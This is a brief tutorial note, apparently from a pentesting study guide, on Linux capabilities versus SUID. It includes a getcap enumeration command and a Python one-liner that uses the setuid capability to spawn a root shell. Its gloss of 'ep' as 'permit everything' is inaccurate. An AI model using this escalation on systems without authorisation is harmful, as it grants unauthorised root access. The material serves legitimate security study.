Capabilities are very similar to SUID in concept. When we talk about traditional linux, we talk about running permission checks from a privileged process and an unprivileged process. So the privileged process is a user who is 0(root/superuser) and unprivileged is anyone other than 0. So privileged processes bypass all kernel permission checks

So, when we take capabilities, we take the privileges that are usually associated with superuser into distinct units. And those units are called capabilities. So, they can be independently enabled and disabled and they are a per thread attribute. 

Capabilities are more secure than SUIDs and thats why there's a transition to using them in modern times.

To hunt for capabilities, we can use this command:

```shell
getcap -r / 2>/dev/null
```

if you see a file capability with setuid+ep, here ep basically means permit everything.

Linux Privilege Escalation using Capabilities - [https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)

SUID vs Capabilities - [https://mn3m.info/posts/suid-vs-capabilities/](https://mn3m.info/posts/suid-vs-capabilities/)
Linux Capabilities Privilege Escalation - [https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099](https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099)

If you have python as one of the capabilities, then you can use that to exploit the machine. Like so:

```shell
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
